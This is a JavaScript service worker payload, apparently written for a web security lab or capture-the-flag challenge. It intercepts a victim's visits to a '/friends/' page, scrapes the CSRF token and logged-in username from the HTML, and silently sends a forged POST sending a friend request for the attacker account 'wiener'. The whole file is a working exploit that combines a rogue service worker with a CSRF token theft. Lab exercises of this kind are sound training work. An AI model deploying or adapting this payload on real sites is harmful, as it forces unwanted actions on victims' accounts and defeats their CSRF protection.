self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);

  // Intercept only the friends page
  if (url.pathname === "/friends/") {
    event.respondWith(
      (async () => {
        const response = await fetch(event.request);
        const text = await response.text();

        // Extract CSRF token from the HTML
        const csrfMatch = text.match(/name="csrf_token" value="(.*?)"/);
        const csrf = csrfMatch ? csrfMatch[1] : null;

        // Extract bot username from the "Logged in as" line
        const botMatch = text.match(/logged in as <b>(.*?)<\/b>/i);
        const botUsername = botMatch ? botMatch[1] : null;

        console.log("[DEBUG] Extracted CSRF:", csrf);
        console.log("[DEBUG] Extracted bot username:", botUsername);

        // Send friend request to yourself
        if (csrf && botUsername) {
          await fetch("/friends/request", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `username=wiener&csrf_token=${encodeURIComponent(csrf)}`
          });
          console.log("[ACTION] Sent friend request to bot.");
        } else {
          console.log("[ERROR] Failed to extract CSRF or username.");
        }

        return new Response(text, {
          headers: response.headers,
          status: response.status,
        });
      })()
    );
  }
});
